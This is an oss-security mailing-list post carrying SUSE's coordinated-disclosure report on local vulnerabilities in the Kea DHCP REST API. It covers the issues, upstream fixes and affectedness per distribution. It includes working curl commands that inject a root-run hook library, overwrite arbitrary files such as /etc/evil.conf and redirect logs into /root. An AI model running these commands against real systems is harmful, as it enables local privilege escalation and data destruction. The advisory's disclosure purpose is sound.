Received: (qmail 24034 invoked by uid 550); 28 May 2025 17:21:32 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 24010 invoked from network); 28 May 2025 17:21:32 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
	t=1748452882; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
	 mime-version:mime-version:content-type:content-type:
	 in-reply-to:in-reply-to:references:references;
	bh=PB8vPr+qMimoINLRy5G3wHwmLf8Z00yOSOwwWZUB8rI=;
	b=fZl/Q216g7+U6+PHtTBUJO3fD60/hlHh2kX2z50eHahw/SnPztAU/2O02L7ir5HiMbuqsg
	Ip7fG/Fs77IKmCH1kZtaT4TxU3ub4QAMo7y7qisic6cWJLunUzIp4D4imb/byuoCrSef/c
	YZ+T+Q0PB7AubpxemzFPxFkvyahsJg4=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
	s=susede2_ed25519; t=1748452882;
	h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
	 mime-version:mime-version:content-type:content-type:
	 in-reply-to:in-reply-to:references:references;
	bh=PB8vPr+qMimoINLRy5G3wHwmLf8Z00yOSOwwWZUB8rI=;
	b=TUOb6WJadpZaigquUxpGG+c6xTZ2sSDDl9hpKTtbTrNmSZpwnk8y0W6Mb0P3dolLFU3G/R
	opz+AKfupCHtSnCQ==
Authentication-Results: smtp-out2.suse.de;
	none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
	t=1748452882; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
	 mime-version:mime-version:content-type:content-type:
	 in-reply-to:in-reply-to:references:references;
	bh=PB8vPr+qMimoINLRy5G3wHwmLf8Z00yOSOwwWZUB8rI=;
	b=fZl/Q216g7+U6+PHtTBUJO3fD60/hlHh2kX2z50eHahw/SnPztAU/2O02L7ir5HiMbuqsg
	Ip7fG/Fs77IKmCH1kZtaT4TxU3ub4QAMo7y7qisic6cWJLunUzIp4D4imb/byuoCrSef/c
	YZ+T+Q0PB7AubpxemzFPxFkvyahsJg4=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
	s=susede2_ed25519; t=1748452882;
	h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
	 mime-version:mime-version:content-type:content-type:
	 in-reply-to:in-reply-to:references:references;
	bh=PB8vPr+qMimoINLRy5G3wHwmLf8Z00yOSOwwWZUB8rI=;
	b=TUOb6WJadpZaigquUxpGG+c6xTZ2sSDDl9hpKTtbTrNmSZpwnk8y0W6Mb0P3dolLFU3G/R
	opz+AKfupCHtSnCQ==
Date: Wed, 28 May 2025 19:21:21 +0200
From: Matthias Gerstner <mgerstner@suse.de>
To: oss-security@lists.openwall.com
Message-ID: <aDdGEfMxLaRJzSK9@kasco.suse.de>
References: <2f8f64a2-118d-458e-9f1a-182d4d88ad17@isc.org>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha256;
	protocol="application/pgp-signature"; boundary="/sJFtjjL1rV4ZsWD"
Content-Disposition: inline
In-Reply-To: <2f8f64a2-118d-458e-9f1a-182d4d88ad17@isc.org>
Subject: Re: [oss-security] ISC has disclosed three vulnerabilities in Kea
 (CVE-2025-32801, CVE-2025-32802, CVE-2025-32803)

--/sJFtjjL1rV4ZsWD
Content-Type: multipart/mixed; protected-headers=v1;
	boundary="V0KiV935LK37uLiw"
Content-Disposition: inline
Date: Wed, 28 May 2025 19:21:21 +0200
From: Matthias Gerstner <mgerstner@suse.de>
To: oss-security@lists.openwall.com
Subject: Re: [oss-security] ISC has disclosed three vulnerabilities in Kea
 (CVE-2025-32801, CVE-2025-32802, CVE-2025-32803)


--V0KiV935LK37uLiw
Content-Type: text/plain; charset=iso-8859-1
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable

Hello list,

we originally reported these issues to upstream and would like to share
our full report below.

This is a report about local security issues in the Kea DHCP server suite.
During a routine review we found a local root exploit and a number of furth=
er
local vulnerabilities in its REST API, affecting Kea packages found in many
Linux and BSD distributions.

Upstream pre-disclosed these issues to the distros mailing list on 2025-05-=
15
and published bugfix releases today. A rendered HTML version of this report=
 is
also available on our blog [1].

1) Introduction
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

The Kea DHCP distribution [2] is the next generation DHCP server suite offe=
red
by the Internet Systems Consortium (ISC). It replaces the traditional ISC D=
HCP
software which has reached its end of life [3].

Since SUSE is also going to ship Kea DHCP in its products, we performed a
routine review of its code base. Even before checking the network security =
of
Kea, we stumbled over a range of local security issues, among them a local
root exploit which is possible in many default installations of Kea on Linux
and BSD distributions. This, as well as some other issues and security
recommendations for Kea follow below in a detailed report.

This report is based on Kea release 2.6.1 [4]. Any source code references in
this report relate to this version. Many systems still ship older releases =
of
Kea, but we believe they are all affected as well by the issues described in
this report.

In the next section an overview of the Kea design, as far as it is relevant
for the issues in this report, is provided. In section 3) the security issu=
es
we found will be discussed in detail. In section 4) further hardening
suggestions are provided. In section 5) the upstream bugfixes for the issues
are discussed. In section 6) the packaging properties and affectedness of K=
ea
in widespread Linux and UNIX systems are documented. Finally in section 7) =
an
overview of the CVE assignments is given.

2) Overview of Kea Design
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

This section provides a short overview of the involved components, to allow
readers that are unfamiliar with Kea to better understand the rest of this
report.

Kea offers three separate services for dhcp4, dhcp6 and dhcp-ddns. A
`kea-ctrl-agent` is active by default in most Kea installations and offers =
an
HTTP REST API listening on localhost:8000. This REST API is based on JSON
requests that are either processed by `kea-ctrl-agent` itself or forwarded =
to
one of the Kea services it controls. To allow forwarding, each Kea service
listens on a UNIX domain socket that is only accessible to `kea-ctrl-agent`.

In most installations, the REST API is by default accessible to all users in
the system without authentication. Many installations run the Kea services
with full root privileges. On Linux systems that use a dedicated service us=
er
account instead, the Linux capability `CAP_NET_BIND_SERVICE` is assigned to
all of the Kea services. The dhcp4 service additionally needs `CAP_NET_RAW`=
 to
function.

The default configuration and the packaging of Kea are important aspects to
judge the exploitability of the issues described in this report. In some
sense, the issues could be considered vendor-specific problems and not
upstream issues (some ISC engineers argued in this direction when we first
reported these issues). The number of affected Kea packages and the fact th=
at
the default configuration installed by the Kea build system also enables an
unauthenticated REST API make these seem like overarching upstream issues to
us, however.

3) Security Issues
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

3.1) Local Privilege Escalation by Injecting a Hook Library via the `set-co=
nfig` Command (CVE-2025-32801)
---------------------------------------------------------------------------=
------------------------------

The `set-config` REST API command allows to completely control the
configuration of `kea-ctrl-agent` itself, as well as of the individual Kea
services. A trivial local privilege escalation is possible by configuring a
hook library under control of an unprivileged user. The following example u=
ses
the `curl` utility to perform the exploit.

    someuser$ curl -X POST -H "Content-Type: application/json" \
        -d '{ "command": "config-set", "arguments":
              { "Control-agent": {"hooks-libraries": [{"library": "/home/so=
meuser/libexploit.so"}] }}}' \
        localhost:8000

By placing a constructor function into `libexploit.so`, attacker controlled
code will be executed by `kea-ctrl-agent` upon `dlopen()` of the library. T=
he
impact is arbitrary code execution with full root privileges on installatio=
ns
that run Kea services as `root`. On systems that use a dedicated service us=
er
for Kea, the impact will be full control over the Kea processes and also
escalated networking privileges.

Hook libraries can be configured for any of the other Kea services as well,
thus code execution can be achieved in the context of each of the Kea daemo=
ns
this way.

Attach to this email is a simple Python script `kea-hook-lib-exploit.py` wh=
ich
can be used to reproduce the issue.

3.2) Arbitrary File Overwrite via `config-write` Command (CVE-2025-32802)
-------------------------------------------------------------------------

The `config-write` REST API command instructs a Kea service to write out its
configuration to an arbitrary file path:

    curl -X POST -H "Content-Type: application/json" \
        -d '{ "command": "config-write", "arguments": { "filename": "/etc/e=
vil.conf" } }' \
        localhost:8000

The file write happens via a regular C++ `std::ofstream` with `trunc` setti=
ng,
i.e. the target file will be truncated and overwritten if it already exists.
The configuration content that is written to disk can as well be controlled=
 by
the attacker, but the JSON format and configuration sanity checks that are
enforced by Kea restrict the degree of freedom of what will eventually be
written out.

If the Kea services run with full root privileges, then this is a local
denial-of-service bordering on a local root exploit. By embedding shell cod=
e,
a crafted JSON configuration written e.g. to a file in `/etc/profile.d` cou=
ld
trigger a local root exploit upon `root` logging in, for example.

If the Kea services are running as dedicated service users, then this attack
vector can be used to corrupt Kea-owned configuration, log and state files,
thus resulting in integrity violation and denial-of-service limited to the
scope of the Kea services.

3.3) Redirection of Log Files to Arbitrary Paths (shared CVE with 3.2)
----------------------------------------------------------------------

This is similar to issue 3.2): an arbitrary new logfile path can be configu=
red
to be used by Kea services. This is an example JSON configuration that
demonstrates the problem:

    {
        "command": "config-set",
            "arguments": {
                 "Control-agent": {
                     "loggers": [{
                         "name": "kea-ctrl-agent",
                         "output-options": [{
                             "output": "/root/bad.log"
                         }],
                         "severity": "DEBUG"
                     }]
                 }
             }
         }
    }

This configuration causes `kea-ctrl-agent` to create the file `/root/bad.lo=
g`
and also to change logging severity to DEBUG, potentially exposing sensitive
internal program state. Also a lock file will be created in
`/root/bad.log.lock`.

This attack vector poses another local denial-of-service vulnerability
bordering on a local root exploit, similar to what is outlined in section
3.2).

3.4) Service Spoofing with Sockets in `/tmp` (shared CVE with 3.2)
------------------------------------------------------------------

For the purposes of forwarding a REST API request to one of the Kea service=
s,
`kea-ctrl-agent` attempts to connect to the service's UNIX domain socket. I=
f a
legit Kea admin tries to send a command to a Kea service that is not curren=
tly
running, like the `kea-dhcp-ddns` service (which isn't configured by default
on most distributions), then the admin can fall victim to a local service
spoofing attack.

Whether this is possible depends upon the directory into which the UNIX dom=
ain
sockets are placed. Many distributions use the public `/tmp` directory for
this. In this case an unprivileged local user can create the UNIX domain
socket in question on its own, for example in `/tmp/kea-ddns-ctrl-socket`. =
If
this succeeds, then API requests will be forwarded to a spoofed service that
can respond with a crafted reply. With this a local attacker can attempt to
trick the admin into performing dangerous actions, or might be able to
intercept sensitive data contained in the request forwarded to the spoofed
service.

We reproduced this attack vector for example on Fedora 41 as follows:

    curl -X POST -H "Content-Type: application/json" \
        -d '{ "command": "config-get", "service": [ "d2" ], "arguments": { =
"secret": "data" } }' \
        localhost:8000

The `d2` service socket is configured by default in `kea-ctrl-agent` and
refers to the `kea-dhcp-ddns` service. When running `strace` on
`kea-ctrl-agent` then the following `connect()` attempt is observed during
this request:

    connect(18, {sa_family=3DAF_UNIX, sun_path=3D"/tmp/kea-ddns-ctrl-socket=
"}, 27) =3D -1 ENOENT (No such file or directory)

A local unprivileged user can bind a UNIX domain socket in
`/tmp/kea-ddns-ctrl-socket` to intercept any such requests.

This attack type also affects Kea services that _are_ configured but not yet
running, e.g. before the Kea service unit or init script is started, or when
Kea services are restarted. Upon startup each service will attempt to
`unlink()` the UNIX domain socket path before binding to it, but this is
subject to a race condition that unprivileged users can win by rebinding a
socket in this location before the legit service has a chance to do so. The
legit service will then fail to start, while the unprivileged user will be
able to intercept REST API requests that are forwarded to the spoofed servi=
ce
by `kea-ctrl-agent`.

3.5) Denial-of-Service issues with Sockets in `/tmp` (shared CVE with 3.2)
--------------------------------------------------------------------------

The use of the `/tmp` directory for the Kea service sockets is generally
problematic. The Kea services create lock files in the socket directory that
are derived from the socket names. Any local user can pre-create either the
UNIX domain sockets or the associated lock files to prevent Kea services fr=
om
starting.

3.6) World-Readable DHCP Lease Files in `/var/lib/kea/*.cvs` (CVE-2025-3280=
3)
----------------------------------------------------------------------------

Many of the distributions we checked grant read access to the state data of
the default Kea in-memory database, which is in most cases found in
`/var/lib/kea`.  This means all local users will be able to access this
information and thereby this poses a local information leak. Whether DHCP
leases are private data is debatable. More sensitive data might be stored in
these files (in a future implementation), however.

We don't recommend to allow general read access to this data. We originally
only reported this as a hardening recommendation, but upstream decided to
assign a CVE for it anyway.

3.7) World-Readable Kea Log Files (shared CVE with 3.6)
-------------------------------------------------------

On most systems we checked, the Kea log files found in `/var/log/kea` or
`/var/log/kea*.log` are world-readable. As a hardening measure we recommend=
 to
restrict access to this data.

We originally only reported this as a hardening recommendation, but upstream
decided to assign a CVE for it anyway.

4) Hardening Suggestions
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

This section contains further hardening suggestions about issues that we do=
n't
consider high severity at the moment.

4.1) Possible Timing Attack against the HTTP Basic Auth Implementation
----------------------------------------------------------------------

`kea-ctrl-agent` uses the HTTP Basic Auth mechanism to implement
authentication on the REST API interface. In this scheme the string
`"<username>:<password>"` is base64 encoded and placed into an
`"Authorization:"` HTTP header.

The verification of these credentials happens in
`BasicHttpAuthConfig::checkAuth()` [5]. The code maintains a
`std::unordered_map<std::string, std::string>`, where the keys consist of t=
he
base64 encoded `"<username>:<password>"` combinations found in the Kea
configuration. The values are the cleartext usernames that can be
authenticated with the credentials found in the key.

In `basic_auth_config.cc:365` [6] the credentials provided by the REST API
client are looked up directly in this map data structure to verify them. The
verification of cleartext passwords can suffer from timing attack weaknesses
when the passwords are compared using optimized string comparison routines.
Attackers can perform statistical analysis of the time required by a service
to report an authentication failure to construct, little by little, a valid
user/password combination.

In the case of `kea-ctrl-agent` it isn't plaintext passwords that are
compared, but the base64 encoded `"<username>:<password>"` strings. This ad=
ds
a bit of complexity but does not prevent a timing attack from succeeding. A
bigger hurdle is the use of the `std::unordered_map`, however, which uses a
hash function to lookup elements in the map. When using the `gcc` compiler
suite and the `libstdc++` standard library, then the default hash function
used for `std::string` is MurmurHash2 [7] with a static seed [8]. While the
hash lookup complicates a possible timing attack, it is still a determinist=
ic
algorithm and an attacker might be able to choose input values in a way that
causes `kea-ctrl-agent` to produce hash values for the hash map lookup that
are suitable for a timing attack.

To be on the safe side we suggest to supply a custom `KeyEqual` template
parameter to the `std::unordered_map`. This key comparison function should
implement a constant-time comparison of the input data to avoid any observa=
ble
timing differences.

Since the complexity of such a timing attack, given the circumstances, will=
 be
very high, we don't see this as a relevant security issue at the moment. A
dedicated attacker might be willing to make an attempt at this and succeed,
however.

4.2) API Credentials Leak via 'get-config' Command
--------------------------------------------------

When API authorization is enabled in the REST API, then the configuration
potentially contains cleartext user names and passwords that can be used for
authentication. A user that already has a valid set of credentials can
discover the credentials of other users by retrieving the configuration via
the API, even if the configuration file would otherwise not be world-readab=
le
in the system.

This means that any user with valid credentials can impersonate any other
user.  This can also be problematic when the credentials of a user are revo=
ked
at some point. By storing the credentials of other users, such a user could
still access the API even after being denied access to Kea. Another issue
could be that users might be reusing the same credentials for other, unrela=
ted
services.

Cleartext credentials should never be exposed on the API level, except maybe
if the client is `root` anyway. Even then it could be a source of informati=
on
leaks, for example if an admin shares a Kea configuration dump (e.g. for
debugging purposes), unaware of the fact that cleartext credentials are
contained in the data.

Users of Kea can circumvent this problem by avoiding storing cleartext
credentials in the Kea configuration and instead referring to credential fi=
les
on disk that are only accessible to privileged users.

5) Bugfixes
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

In our initial report we suggested to upstream to restrict paths from where
hook libraries are loaded (issue 3.1) and also paths where configuration and
log files are written to (issues 3.2, 3.3). It is obvious, however, that the
unauthenticated REST API is problematic beyond the concrete exploit scenari=
os
we explored. Arbitrary users in the system should not be able to fully cont=
rol
Kea's configuration, for example. Thus we advised to enforce authentication=
 on
REST API level by default.

To fix the issues described in this report, upstream published bugfix relea=
ses
for all currently supported versions of Kea:

- Release 2.4.2 [9]
- Release 2.6.3 [10]
- Release 2.7.9 [11]

We looked into release 2.6.3 and believe the bugfixes are thorough. As is a=
lso
documented in the upstream release notes [12], the following changes have b=
een
introduced:

- For many operations only safe directories are allowed for reading from or
  writing to. Among others this covers the following aspects:
  - Hook libraries can only be loaded from a trusted system directory
    (addresses issue 3.1).
  - Configuration files can only be written to the trusted system configura=
tion
    directory (addresses issue 3.2).
  - Logfiles can only be written to the log directory determined during bui=
ld
    time (addresses issue 3.3).
- The default configuration files installed by Kea now enforce authenticati=
on
  of the REST API.
- The log, state and socket directories are now installed without the world
  readable / world writable bits set (addresses issues 3.5, 3.6, 3.7).
- Sockets are now placed under `/var/run/kea` by default. This
  directory must not be world-writable (addresses issue 3.5).
- The documentation and example files have been updated to avoid issues like
  discussed in this report.

The hardenings for the issues described in section 4) are not yet available,
but upstream intends to address them in the near future.

6) Affectedness of Kea Configurations on Common Linux and UNIX Systems
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

Kea is a cross-platform project that also targets traditional UNIX systems,
which might be the reason why there are no well established standards for t=
he
packaging of Kea. Every distribution integrates Kea in its own way, leading=
 to
a complex variety of outcomes with regards to affectedness.  The defaults a=
nd
the resulting affectedness on a range of current well-known Linux and BSD
systems are documented in detail in this section.

All systems we looked at have been updated to the most recent package versi=
ons
on 2025-05-23.

6.1) Arch Linux
---------------

|System Release | rolling release (as of 2025-05-23) |
|Kea Version    | 2.6.1                              |
|Kea Credentials| `root:root`                        |
|Kea Socket Dir | /tmp                               |
|Kea Log Dir    | /var/log/kea-.log, mode 0644       |
|Kea State Dir  | /var/lib/kea, mode 0755            |
|Affected By    | 3.1 through 3.7                    |

Arch Linux is affected by all the issues.

6.2) Debian Linux
-----------------

|System Release | 12.10, 12.11 (Bookworm)                      |
|Kea Version    | 2.2.0                                        |
|Kea Credentials| `_kea:_kea`                                  |
|Kea Socket Dir | /run/kea, owned by `_kea:_kea` mode 0755     |
|Kea Log Dir    | /var/log/kea, owned by `_kea:_kea` mode 0750 |
|Kea State Dir  | /var/lib/kea, mode 0755                      |
|Affected By    | 3.2 (partially), 3.3 (partially), 3.6        |

When we first discovered these issues we looked into Debian 12.10. Meanwhile
Debian 12.11 has been released. The situation seems to be the same in both
versions, however.

No local root exploit is possible here, because the services run as non-roo=
t.
Debian also applies an AppArmor profile to Kea services. This makes the hook
library injection (3.1) difficult. For the injection to succeed, a directory
would be needed that can be written to by the attacker and from where the K=
ea
service is allowed to read and map a library. This seems not possible in the
current AppArmor profile used for Kea. Due to this, Debian is not affected =
by
3.1) at all.

3.2) and 3.3) only affect files owned by `_kea` and that are allowed to be
written to according to AppArmor configuration. This still allows to corrupt
the log, lock and state files owned by `_kea`.

The only information leak is found in the state directory (3.6); logs are
protected.

### AppArmor Security

We checked more closely if there is a loophole in the Kea AppArmor profiles=
 to
make arbitrary code execution (3.1) possible after all. The profiles for the
dhcp4, dhcp6 and ddns Kea services allow reading and mapping of files found=
 in
`/home/*/.Private/**`, with the restriction that the files must be owned by
`_kea`. An attacker with a home directory can place an injection library in
its `$HOME/.Private/libexploit.so`. Only the ownership of the file is
preventing the exploit from succeeding.

By leveraging issue 3.2), the Kea services can be instructed to create `_ke=
a`
owned files in the attacker's `$HOME/.Private`. The content of the created
files is not fully attacker controlled, however, so it will not be possible=
 to
craft a valid ELF object for loading via `dlopen()` this way. By placing a
setgid-directory in `$HOME/.Private/evil-dir`, any files created in this
directory will even have the group-ownership of the attacker. The file mode
will be 0644, however, so the attacker is still not able to write to the fi=
le.
Our research shows that there is only a very thin line of defense left agai=
nst
this arbitrary code execution in `_kea:_kea` context on Debian, but it seems
to hold.

6.3) Ubuntu Linux
-----------------

|System Release | 24.04.02 LTS                                 |
|Kea version    | 2.4.1                                        |
|Kea Credentials| `_kea:_kea`                                  |
|Kea Socket Dir | /run/kea, owned by `_kea:_kea` mode 0755     |
|Kea Log Dir    | /var/log/kea, owned by `_kea:_kea` mode 0750 |
|Kea State Dir  | /var/lib/kea, mode 0755                      |
|Affected By    | 3.6                                          |

Ubuntu is mostly equivalent to the situation on Debian Linux with one major
difference: REST API access authentication is enforced either by configurin=
g a
custom "user:password" pair, or by generating a random password. If no
password is configured, `kea-ctrl-agent` will not start.

Due to this, Ubuntu is not affected by 3.1 and 3.2 at all. Only the
information leak in the state directory (3.6) exists.

6.4) Fedora Linux
-----------------

|               |              Fedora 41                     |             =
 Fedora 42                     |
| --------------| ------------------------------------------ | ------------=
------------------------------ |
|Kea Version    |     2.6.1                                  |      2.6.2  =
                               |
|Kea Credentials| `kea:kea`                                  |        "    =
                               |
|Kea Socket Dir |     /tmp                                   |        "    =
                               |
|Kea Log Dir    | /var/log/kea, mode 0755                    | /var/log/kea=
 mode 0750                     |
|Kea State Dir  | /var/lib/kea, mode 0750                    |        "    =
                               |
|Affected By    | (all limited to the `kea:kea` credentials) | (all limited=
 to the `kea:kea` credentials) |
|               |     3.1, 3.2, 3.3, 3.4, 3.5, 3.7           |    3.1, 3.2,=
 3.3, 3.4, 3.5                 |

When we first discovered these issues we looked into Fedora 41. Meanwhile
Fedora 42 has been released. There are some changes found in Fedora 42, most
notably a safer mode for `/var/log/kea`.

No local root exploit is possible on Fedora, because the services run as
non-root.

Items 3.1 and 3.2 only affect Kea integrity and escalation of the
`CAP_NET_RAW` and `CAP_NET_BIND_SERVICE` capabilities. There is no SELinux
policy in effect for Kea, thus there are no additional protection layers
present that would prevent arbitrary code execution in the context of
`kea:kea` (3.1).

Fedora is affected by 3.3, 3.4 and 3.5 within the constraints of the `kea:k=
ea`
credentials. On Fedora 41 there exists an information leak in the log
directory (3.7). The state directory is safe on both Fedora versions.

6.5) Gentoo Linux
-----------------

|-------------- | ----------------------------------------------------- |
|System Release | rolling release (as of 2025-05-23)                    |
|Kea Version    | 2.4.1                                                 |
|Kea Credentials| `root:root`                                           |
|Kea Socket Dir | /run/kea owned by `dhcp:dhcp` mode 0750               |
|Kea Log Dir    | /var/log/kea, owned by `root:dhcp` mode 0750          |
|Kea State Dir  | /var/lib/kea, owned by `root:dhcp` mode 0750          |
|Affected By    | if `kea-ctrl-agent` is manually enabled: 3.1, 3.2, 3.3|

On Gentoo Linux Kea is only available as an unstable `~amd64` ebuild. It
seems still incomplete, because the default configuration is broken (wrong
paths) and the services won't start. Also the `kea-ctrl-agent` is not part =
of
the default configuration.

The directory permissions are inconsistent with the `root:root` credentials
the Kea services are running with. This creates opportunities for a
compromised `dhcp` user/group to stage symlink attacks in `/run/kea`, for
example.

There are no information leaks and the `/tmp` directory is not used for
sockets. Since the agent is not configured by default at all, we consider t=
hat
Gentoo is not affected by any of the issues.

When `kea-ctrl-agent` is actively added to the mix and authorization is not
enabled on the REST API, then Gentoo would be affected by issues 3.1, 3.2 a=
nd
3.3.

6.6) openSUSE Tumbleweed
------------------------

|  System Release   |      rolling release (as of 2025-04-01)            | =
           rolling release (as of 2025-05-23)                |
| ----------------- | -------------------------------------------------- | =
------------------------------------------------------------ |
|  Kea Version      | 2.6.1                                              | =
2.6.2                                                        |
|  Kea Credentials  | `root:root`                                        | =
`keadhcp:keadhcp`                                            |
|  Kea Socket Dir   | /tmp                                               | =
/tmp                                                         |
|  Kea Log Dir      | /var/log/kea, owned by `keadhcp:keadhcp` mode 0755 | =
mode changed to 0750                                         |
|  Kea State Dir    | /var/lib/kea, owned by `root:root` mode 0755       | =
/var/lib/kea, owned by `keadhcp:keadhcp` mode 0750           |
|  Affected By      | 3.1 through 3.7                                    | =
(all limited to keadhcp credentials) 3.1, 3.2, 3.3, 3.4, 3.5 |

When we first discovered these issues, openSUSE Tumbleweed was fully affect=
ed
by all of them. We asked our Kea maintainer to harden the packaging already
before the publication of these issues, which was possible without disclosi=
ng
any information about the vulnerabilities. In the current packaging on
openSUSE Tumbleweed Kea no longer runs as `root` and the systemd unit has
`ProtectSystem=3Dfull` enabled, which adds another layer of defense. The
information leaks in `/var/log/kea` and `/var/lib/kea` have been fixed as
well.

The more disruptive changes have been delayed until the general publication=
 of
these issues and will soon be addressed as well.

6.7) FreeBSD
------------

|System Release | 14.2                                               |
|Kea Version    | 2.6.1                                              |
|Kea Credentials| `root:root`                                        |
|Kea Socket Dir | /tmp                                               |
|Kea Log Dir    | /var/log/kea-\.log, owned by `root:root` mode 0644|
|Kea State Dir  | /var/db/kea, owned by `root:wheel` mode 0755       |
|Affected By    | 3.1 through 3.7                                    |

FreeBSD is affected by all the issues.

6.8) NetBSD (pkgsrc binary)
---------------------------

|System Release | 10.1                                                 |
|Kea Version    | 2.6.1                                                |
|Kea Credentials| `root:root`                                          |
|Kea Socket Dir | /tmp                                                 |
|Kea Log Dir    | /var/log/kea-\.log, owned by `root:wheel` mode 0644 |
|Kea State Dir  | /var/lib/kea, owned by `root:wheel` mode 0755        |
|Affected By    | if example configuration is used unmodified: 3.1 through =
3.7 |

NetBSD supports the installation of a pkgsrc [13] binary distribution of Ke=
a,
which is also available on some other systems like MacOS. This distribution=
 of
Kea is affected by all the issues.

By default no configuration is active, however. Admins have to copy over the
configuration from example files found in `/usr/pkg/share/examples/kea`. Th=
us
it is debatable whether NetBSD is affected in default installations of Kea.

6.9) OpenBSD
------------

|System Release | 7.6                                          |       7.7 =
          |
|Kea Version    | 2.4.1                                        |        "  =
          |
|Kea Credentials| `root:root`                                  |        "  =
          |
|Kea Socket Dir | /var/run/kea, owned by `root:_kea` mode 0775 |        "  =
          |
|Kea Log Dir    | redirected to syslog (world-readable)        |        "  =
          |
|Kea State Dir  | /var/lib/kea, owned by `root:_kea` mode 0775 |    mode 07=
50        |
|Affected By    | 3.1, 3.2, 3.3, 3.6, 3.7                      | 3.1, 3.2, =
3.3, 3.7  |

When we first discovered these issues we looked into OpenBSD 7.6.  Meanwhile
OpenBSD 7.7 has been released. As far as we can see only the mode of the
`/var/lib/kea` directory changed in this release.

OpenBSD is affected by issues 3.1, 3.2 and 3.3. Sockets are placed in a
dedicated directory, thus 3.4 and 3.5 do not apply here. There exist
information leaks for log and state data (the latter only in release 7.6).

The `_kea` group ownership for the socket and state dir is inconsistent with
the actual daemon credentials. A compromised `_kea` group could stage symli=
nk
attacks in these directories.

7) CVE Assignments
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

Kea upstream assigned the following CVEs. Some of them are cumulative and
cover multiple of the issues found in this report.

|   CVE          | Corresponding Issues | Description                      =
                                         |
| -------------- | -------------------- | ---------------------------------=
---------------------------------------- |
| CVE-2025-32801 | 3.1                  | Loading a malicious hook library =
can lead to local privilege escalation.  |
| CVE-2025-32802 | 3.2, 3.2, 3.4, 3.5   | Insecure handling of file paths a=
llows multiple local attacks.            |
| CVE-2025-32803 | 3.6, 3.7             | Insecure file permissions can res=
ult in confidential information leakage. |

Timeline
=3D=3D=3D=3D=3D=3D=3D=3D

- 2025-04-01: We reported the findings via a private issue [14] in the ISC =
GitLab.
- 2025-04-02: After some initial controversial discussions, Kea upstream de=
cided to accept the offer for coordinated disclosure and to work on bugfixe=
s.
- 2025-04-10: Upstream assigned CVEs for the issues.
- 2025-04-29: Upstream communicated a coordinated release date of 2025-05-28
  and their intention to involve the distros mailing list [15] 5 days earli=
er.
  Given the range of affected distributions and the severity of the issues,=
 we
  suggested to involve the distros mailing list already 10 days before
  publication.
- 2025-05-15: Kea upstream pre-disclosed the vulnerabilities to the distros
  mailing list [15].
- 2025-05-22: Kea upstream shared links to private bugfix releases 2.4.2,
  2.6.3, and 2.7.9, containing fixes for the issues, both with the distros
  mailing list and in the private GitLab issue.
- 2025-05-26: We inspected the differences between version 2.6.2 and version
  2.6.3 and found the bugfixes to be thorough.
- 2025-05-28: Publication happened as planned.

References
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

- SUSE Bugzilla review bug for Kea [16]
- ISC Kea project page [2]
- ISC GitLab private issue detailing the issues from this report [14]

[1]: https://security.opensuse.org/2025/05/28/kea-dhcp-security-issues.html
[2]: https://www.isc.org/kea
[3]: https://www.isc.org/blogs/isc-dhcp-eol
[4]: https://github.com/isc-projects/kea/tree/Kea-2.6.1
[5]: https://gitlab.isc.org/isc-projects/kea/-/blob/Kea-2.6.2/src/lib/http/=
basic_auth_config.cc?ref_type=3Dtags#L342
[6]: https://gitlab.isc.org/isc-projects/kea/-/blob/Kea-2.6.2/src/lib/http/=
basic_auth_config.cc?ref_type=3Dtags#L365
[7]: https://github.com/gcc-mirror/gcc/blob/97a36b466ba1420210294f0a1dd7002=
054ba3b7e/libstdc%2B%2B-v3/libsupc%2B%2B/hash_bytes.cc#L74
[8]: https://github.com/gcc-mirror/gcc/blob/97a36b466ba1420210294f0a1dd7002=
054ba3b7e/libstdc%2B%2B-v3/include/bits/functional_hash.h#L205
[9]: https://downloads.isc.org/isc/kea/2.4.2
[10]: https://downloads.isc.org/isc/kea/2.6.3
[11]: https://downloads.isc.org/isc/kea/2.7.9
[12]: https://downloads.isc.org/isc/kea/2.6.3/Kea-2.6.3-ReleaseNotes.txt
[13]: https://pkgsrc.org
[14]: https://gitlab.isc.org/isc-projects/kea/-/issues/3825
[15]: https://oss-security.openwall.org/wiki/mailing-lists/distros
[16]: https://bugzilla.suse.com/show_bug.cgi?id=3D1234265

--=20
Matthias Gerstner <matthias.gerstner@suse.de>
Security Engineer
https://www.suse.com/security
